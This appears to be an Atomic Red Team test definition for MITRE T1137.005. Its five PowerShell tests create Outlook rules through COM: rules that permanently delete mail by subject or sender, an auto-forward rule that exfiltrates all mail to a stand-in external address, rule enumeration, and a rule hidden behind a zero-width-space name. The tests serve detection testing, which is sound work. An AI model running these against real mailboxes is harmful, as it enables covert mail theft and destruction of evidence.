@@ -1,0 +1,430 @@
+attack_technique: T1137.005
+display_name: "Office Application Startup: Outlook Rules"
+
+atomic_tests:
+
+# ============================================================
+# TEST 1 — COM Object: Rule Triggers on Subject Keyword
+# ============================================================
+- name: Outlook Rule - Subject Trigger with DeletePermanently Action via COM Object
+  auto_generated_guid: ffadc988-b682-4a68-bd7e-4803666be637
+  description: |
+    Creates a malicious Outlook rule via the COM object that permanently deletes
+    emails when an email with a specific subject keyword arrives. Simulates
+    adversary persistence via Outlook Rules (T1137.005). Uses DeletePermanently
+    action as it does not require a resolved Exchange folder unlike MoveToFolder.
+    NOTE: olRuleActionStartApplication cannot be created programmatically per
+    Microsoft's Rules object model - DeletePermanently is used as the supported
+    equivalent that generates the same rule-creation artefact.
+    NOTE: This test MUST be run from a non-elevated (standard user) PowerShell
+    session. Outlook COM fails with 0x80080005 when invoked as Administrator.
+  supported_platforms:
+    - windows
+  input_arguments:
+    rule_name:
+      description: Name for the malicious Outlook rule
+      type: string
+      default: AtomicTest_T1137005_SubjectTrigger
+    trigger_subject:
+      description: Email subject keyword that triggers the rule
+      type: string
+      default: "atomic-rt-trigger"
+  dependencies:
+    - description: Classic Outlook must be installed (required for COM automation)
+      prereq_command: |
+        $clsid = (Get-ItemProperty "REGISTRY::HKEY_CLASSES_ROOT\Outlook.Application\CLSID" -ErrorAction SilentlyContinue).'(Default)'
+        if ($clsid) { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        Write-Host "[-] Classic Outlook is not installed or COM is not registered."
+        Write-Host "    Install Microsoft 365 Apps with Classic Outlook before running this test."
+        Write-Host "    Note: The new Outlook for Windows does NOT support COM automation."
+        exit 1
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
+      if ($isAdmin) {
+          Write-Host "[-] This test must be run from a non-elevated PowerShell session."
+          Write-Host "    Outlook COM fails with 0x80080005 when run as Administrator."
+          exit 1
+      }
+
+      $outlook   = New-Object -ComObject Outlook.Application
+      $namespace = $outlook.GetNamespace("MAPI")
+      $rules     = $namespace.DefaultStore.GetRules()
+      $rule      = $rules.Create("#{rule_name}", 0)
+
+      $cond = $rule.Conditions.Subject
+      $cond.Enabled = $true
+      $cond.Text    = @("#{trigger_subject}")
+
+      $action         = $rule.Actions.DeletePermanently
+      $action.Enabled = $true
+
+      $rule.Enabled = $true
+      $rules.Save()
+      Write-Host "[+] Rule '#{rule_name}' created. Emails with subject '#{trigger_subject}' will be permanently deleted."
+    cleanup_command: |
+      $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
+      if ($isAdmin) {
+          Write-Host "[-] Cleanup must be run from a non-elevated PowerShell session. Skipping."
+          exit 1
+      }
+      $outlook   = New-Object -ComObject Outlook.Application
+      $namespace = $outlook.GetNamespace("MAPI")
+      $rules     = $namespace.DefaultStore.GetRules()
+      $removed   = $false
+      for ($i = $rules.Count; $i -ge 1; $i--) {
+          if ($rules.Item($i).Name -eq "#{rule_name}") {
+              $rules.Remove($rules.Item($i).Name)
+              $removed = $true
+          }
+      }
+      if ($removed) {
+          $rules.Save()
+          Write-Host "[+] All instances of rule '#{rule_name}' removed."
+      } else {
+          Write-Host "[*] Rule '#{rule_name}' not found - already removed."
+      }
+
+
+# ============================================================
+# TEST 2 — COM Object: Rule Triggers on Sender Address
+# ============================================================
+- name: Outlook Rule - Sender Address Trigger with DeletePermanently Action via COM Object
+  auto_generated_guid: bddfd8d4-7687-4971-b611-50a537ab3ab4
+  description: |
+    Creates an Outlook rule via COM that permanently deletes emails received
+    from a specific sender address. Adversaries use sender-based triggers to
+    make rules appear more legitimate (e.g. disguised as a filter for a
+    specific colleague). Tests a different rule condition path through the
+    COM object model. Uses DeletePermanently as it does not require a resolved
+    Exchange folder unlike MoveToFolder.
+    NOTE: This test MUST be run from a non-elevated (standard user) PowerShell
+    session. Outlook COM fails with 0x80080005 when invoked as Administrator.
+  supported_platforms:
+    - windows
+  input_arguments:
+    rule_name:
+      description: Name for the malicious Outlook rule
+      type: string
+      default: AtomicTest_T1137005_SenderTrigger
+    trigger_sender:
+      description: Sender email address that triggers the rule
+      type: string
+      default: "atomictest@redteam.local"
+  dependencies:
+    - description: Classic Outlook must be installed (required for COM automation)
+      prereq_command: |
+        $clsid = (Get-ItemProperty "REGISTRY::HKEY_CLASSES_ROOT\Outlook.Application\CLSID" -ErrorAction SilentlyContinue).'(Default)'
+        if ($clsid) { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        Write-Host "[-] Classic Outlook is not installed or COM is not registered."
+        Write-Host "    Install Microsoft 365 Apps with Classic Outlook before running this test."
+        Write-Host "    Note: The new Outlook for Windows does NOT support COM automation."
+        exit 1
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
+      if ($isAdmin) {
+          Write-Host "[-] This test must be run from a non-elevated PowerShell session."
+          Write-Host "    Outlook COM fails with 0x80080005 when run as Administrator."
+          exit 1
+      }
+
+      $outlook   = New-Object -ComObject Outlook.Application
+      $namespace = $outlook.GetNamespace("MAPI")
+      $rules     = $namespace.DefaultStore.GetRules()
+      $rule      = $rules.Create("#{rule_name}", 0)
+
+      $cond = $rule.Conditions.From
+      $cond.Enabled = $true
+      $cond.Recipients.Add("#{trigger_sender}")
+      $cond.Recipients.ResolveAll() | Out-Null
+
+      $action         = $rule.Actions.DeletePermanently
+      $action.Enabled = $true
+
+      $rule.Enabled = $true
+      $rules.Save()
+      Write-Host "[+] Sender-based rule '#{rule_name}' created. Emails from '#{trigger_sender}' will be permanently deleted."
+    cleanup_command: |
+      $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
+      if ($isAdmin) {
+          Write-Host "[-] Cleanup must be run from a non-elevated PowerShell session. Skipping."
+          exit 1
+      }
+      $outlook   = New-Object -ComObject Outlook.Application
+      $namespace = $outlook.GetNamespace("MAPI")
+      $rules     = $namespace.DefaultStore.GetRules()
+      $removed   = $false
+      for ($i = $rules.Count; $i -ge 1; $i--) {
+          if ($rules.Item($i).Name -eq "#{rule_name}") {
+              $rules.Remove($rules.Item($i).Name)
+              $removed = $true
+          }
+      }
+      if ($removed) {
+          $rules.Save()
+          Write-Host "[+] All instances of rule '#{rule_name}' removed."
+      } else {
+          Write-Host "[*] Rule '#{rule_name}' not found - already removed."
+      }
+
+
+# ============================================================
+# TEST 3 — COM Object: Auto-Forward Rule (Exfiltration)
+# ============================================================
+- name: Outlook Rule - Auto-Forward Emails to External Address via COM Object
+  auto_generated_guid: b0bd3d76-a57c-4699-83f4-8cd798dd09bd
+  description: |
+    Creates an Outlook rule that automatically forwards all received emails to
+    an external address. Simulates Business Email Compromise (BEC) and insider
+    threat scenarios where adversaries establish forwarding rules to exfiltrate
+    mail. One of the most commonly observed real-world abuses of Outlook rules.
+    Detected by Exchange mail flow anomalies and Microsoft Secure Score
+    forwarding alerts.
+    NOTE: No actual email is forwarded during this test - the rule is created
+    but a trigger email is not sent. Run cleanup immediately after verification.
+    NOTE: This test MUST be run from a non-elevated (standard user) PowerShell
+    session. Outlook COM fails with 0x80080005 when invoked as Administrator.
+  supported_platforms:
+    - windows
+  input_arguments:
+    rule_name:
+      description: Name for the forwarding rule
+      type: string
+      default: AtomicTest_T1137005_ForwardExfil
+    forward_to_address:
+      description: Email address to forward mail to (use a controlled test address)
+      type: string
+      default: "atomictest-exfil@redteam.local"
+  dependencies:
+    - description: Classic Outlook must be installed (required for COM automation)
+      prereq_command: |
+        $clsid = (Get-ItemProperty "REGISTRY::HKEY_CLASSES_ROOT\Outlook.Application\CLSID" -ErrorAction SilentlyContinue).'(Default)'
+        if ($clsid) { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        Write-Host "[-] Classic Outlook is not installed or COM is not registered."
+        Write-Host "    Install Microsoft 365 Apps with Classic Outlook before running this test."
+        Write-Host "    Note: The new Outlook for Windows does NOT support COM automation."
+        exit 1
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
+      if ($isAdmin) {
+          Write-Host "[-] This test must be run from a non-elevated PowerShell session."
+          Write-Host "    Outlook COM fails with 0x80080005 when run as Administrator."
+          exit 1
+      }
+
+      $outlook   = New-Object -ComObject Outlook.Application
+      $namespace = $outlook.GetNamespace("MAPI")
+      $rules     = $namespace.DefaultStore.GetRules()
+      $rule      = $rules.Create("#{rule_name}", 0)
+
+      $action = $rule.Actions.Forward
+      $action.Enabled = $true
+      $action.Recipients.Add("#{forward_to_address}")
+      $action.Recipients.ResolveAll() | Out-Null
+
+      $rule.Enabled = $true
+      $rules.Save()
+      Write-Host "[+] Auto-forward rule '#{rule_name}' created -> #{forward_to_address}"
+      Write-Host "[!] Run cleanup immediately after verifying rule creation in Outlook."
+    cleanup_command: |
+      $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
+      if ($isAdmin) {
+          Write-Host "[-] Cleanup must be run from a non-elevated PowerShell session. Skipping."
+          exit 1
+      }
+      $outlook   = New-Object -ComObject Outlook.Application
+      $namespace = $outlook.GetNamespace("MAPI")
+      $rules     = $namespace.DefaultStore.GetRules()
+      $removed   = $false
+      for ($i = $rules.Count; $i -ge 1; $i--) {
+          if ($rules.Item($i).Name -eq "#{rule_name}") {
+              $rules.Remove($rules.Item($i).Name)
+              $removed = $true
+          }
+      }
+      if ($removed) {
+          $rules.Save()
+          Write-Host "[+] All instances of forwarding rule '#{rule_name}' removed."
+      } else {
+          Write-Host "[*] Rule '#{rule_name}' not found - already removed."
+      }
+
+
+# ============================================================
+# TEST 4 — COM Object: Enumerate All Existing Rules (Discovery)
+# ============================================================
+- name: Outlook Rules - Enumerate Existing Rules via PowerShell COM Object
+  auto_generated_guid: 5ff5249a-5807-480e-ab52-c430497a8a25
+  description: |
+    Enumerates all Outlook rules configured on the local profile using the
+    PowerShell COM object. Simulates the discovery phase where an adversary
+    audits existing rules before implanting their own, or where a threat actor
+    tool such as Ruler lists rules to understand the environment. This
+    enumeration should itself generate telemetry - use it to validate that
+    your monitoring catches PowerShell spawning Outlook COM for recon purposes.
+    NOTE: This test MUST be run from a non-elevated (standard user) PowerShell
+    session. Outlook COM fails with 0x80080005 when invoked as Administrator.
+  supported_platforms:
+    - windows
+  dependencies:
+    - description: Classic Outlook must be installed (required for COM automation)
+      prereq_command: |
+        $clsid = (Get-ItemProperty "REGISTRY::HKEY_CLASSES_ROOT\Outlook.Application\CLSID" -ErrorAction SilentlyContinue).'(Default)'
+        if ($clsid) { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        Write-Host "[-] Classic Outlook is not installed or COM is not registered."
+        Write-Host "    Install Microsoft 365 Apps with Classic Outlook before running this test."
+        Write-Host "    Note: The new Outlook for Windows does NOT support COM automation."
+        exit 1
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
+      if ($isAdmin) {
+          Write-Host "[-] This test must be run from a non-elevated PowerShell session."
+          Write-Host "    Outlook COM fails with 0x80080005 when run as Administrator."
+          exit 1
+      }
+
+      $outlook = New-Object -ComObject Outlook.Application
+      $rules   = $outlook.GetNamespace("MAPI").DefaultStore.GetRules()
+
+      Write-Host "`n[*] Enumerating Outlook rules on local profile..."
+      Write-Host "    Total rules found: $($rules.Count)`n"
+
+      for ($i = 1; $i -le $rules.Count; $i++) {
+          $r = $rules.Item($i)
+          Write-Host "  Rule $i : Name='$($r.Name)' | Enabled=$($r.Enabled)"
+      }
+
+      if ($rules.Count -eq 0) {
+          Write-Host "  (No rules configured)"
+      }
+    cleanup_command: |
+      Write-Host "[*] No cleanup required for enumeration test."
+    
+
+
+# ============================================================
+# TEST 5 — Hidden Rule: Obfuscated Name (MAPI Evasion)
+# FIX: Write script to a temp .ps1 file and invoke it via
+#      Start-Process to avoid the ART executor's argument
+#      quoting mangling the zero-width space byte sequence.
+# ============================================================
+- name: Outlook Rule - Create Rule with Obfuscated Blank Name (MAPI Evasion)
+  auto_generated_guid: cb814cf8-24f2-41dc-a1cd-1c2073276d4a
+  description: |
+    Creates an Outlook rule with a zero-width space as its display name,
+    making it appear blank and invisible in the standard Outlook Rules UI.
+    Simulates the hidden inbox rule technique documented by Damian Pfammatter
+    (2018) and referenced in MITRE ATT&CK T1137.005 - adversaries use MAPI
+    editors or Ruler to blank PR_RULE_MSG_NAME so the rule does not appear
+    during casual rule auditing. Tests whether monitoring catches rules that
+    are invisible in the Outlook GUI but detectable via MFCMapi or
+    Get-InboxRule on Exchange. Uses PlaySound action as RunApplication
+    cannot be created programmatically per Microsoft's Rules object model.
+    NOTE: This test MUST be run from a non-elevated (standard user) PowerShell
+    session. Outlook COM fails with 0x80080005 when invoked as Administrator.
+    NOTE: Script is written to a temp file before execution to prevent the
+    ART executor's quote-wrapping from mangling the zero-width space bytes.
+  supported_platforms:
+    - windows
+  input_arguments:
+    trigger_subject:
+      description: Subject keyword to trigger the hidden rule
+      type: string
+      default: "atomic-rt-hidden"
+    sound_file_path:
+      description: Path to .wav file used as the rule action payload indicator
+      type: string
+      default: "C:\\Windows\\Media\\notify.wav"
+  dependencies:
+    - description: Classic Outlook must be installed (required for COM automation)
+      prereq_command: |
+        $clsid = (Get-ItemProperty "REGISTRY::HKEY_CLASSES_ROOT\Outlook.Application\CLSID" -ErrorAction SilentlyContinue).'(Default)'
+        if ($clsid) { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        Write-Host "[-] Classic Outlook is not installed or COM is not registered."
+        Write-Host "    Install Microsoft 365 Apps with Classic Outlook before running this test."
+        Write-Host "    Note: The new Outlook for Windows does NOT support COM automation."
+        exit 1
+    - description: Sound file must exist for PlaySound action
+      prereq_command: |
+        if (Test-Path "#{sound_file_path}") { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        Write-Host "[-] Sound file not found at #{sound_file_path}"
+        Write-Host "    Specify a valid .wav file path in the sound_file_path input argument."
+        exit 1
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
+      if ($isAdmin) {
+          Write-Host "[-] This test must be run from a non-elevated PowerShell session."
+          Write-Host "    Outlook COM fails with 0x80080005 when run as Administrator."
+          exit 1
+      }
+      $tmpScript = "$env:TEMP\T1137005_hidden_rule_create.ps1"
+      $lines = @(
+          '$hiddenName = [System.Text.Encoding]::Unicode.GetString([byte[]](0x0B, 0x20))',
+          '$outlook   = New-Object -ComObject Outlook.Application',
+          '$namespace = $outlook.GetNamespace("MAPI")',
+          '$rules     = $namespace.DefaultStore.GetRules()',
+          '$rule      = $rules.Create($hiddenName, 0)',
+          '$cond = $rule.Conditions.Subject',
+          '$cond.Enabled = $true',
+          '$cond.Text    = @("#{trigger_subject}")',
+          '$action          = $rule.Actions.PlaySound',
+          '$action.Enabled  = $true',
+          '$action.FilePath = "#{sound_file_path}"',
+          '$rule.Enabled = $true',
+          '$rules.Save()',
+          'Write-Host "[+] Hidden rule created with zero-width space name."',
+          'Write-Host "[*] Open Outlook via File -> Manage Rules and Alerts - rule name will appear blank."',
+          'Write-Host "[*] Verify rule exists via PowerShell COM enumeration (Test 4) or Get-InboxRule in Exchange."'
+      )
+      $lines -join "`n" | Set-Content -Path $tmpScript -Encoding UTF8
+      powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmpScript
+      Remove-Item $tmpScript -ErrorAction SilentlyContinue
+    cleanup_command: |
+      $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
+      if ($isAdmin) {
+          Write-Host "[-] Cleanup must be run from a non-elevated PowerShell session. Skipping."
+          exit 1
+      }
+      $tmpScript = "$env:TEMP\T1137005_hidden_rule_cleanup.ps1"
+      $lines = @(
+          '$hiddenName = [System.Text.Encoding]::Unicode.GetString([byte[]](0x0B, 0x20))',
+          '$outlook    = New-Object -ComObject Outlook.Application',
+          '$namespace  = $outlook.GetNamespace("MAPI")',
+          '$rules      = $namespace.DefaultStore.GetRules()',
+          '$removed    = $false',
+          'for ($i = $rules.Count; $i -ge 1; $i--) {',
+          '    if ($rules.Item($i).Name -eq $hiddenName) {',
+          '        $rules.Remove($rules.Item($i).Name)',
+          '        $removed = $true',
+          '    }',
+          '}',
+          'if ($removed) {',
+          '    $rules.Save()',
+          '    Write-Host "[+] Hidden rule(s) removed."',
+          '} else {',
+          '    Write-Host "[-] Hidden rule not found - may have already been removed."',
+          '}'
+      )
+      $lines -join "`n" | Set-Content -Path $tmpScript -Encoding UTF8
+      powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmpScript
+      Remove-Item $tmpScript -ErrorAction SilentlyContinue
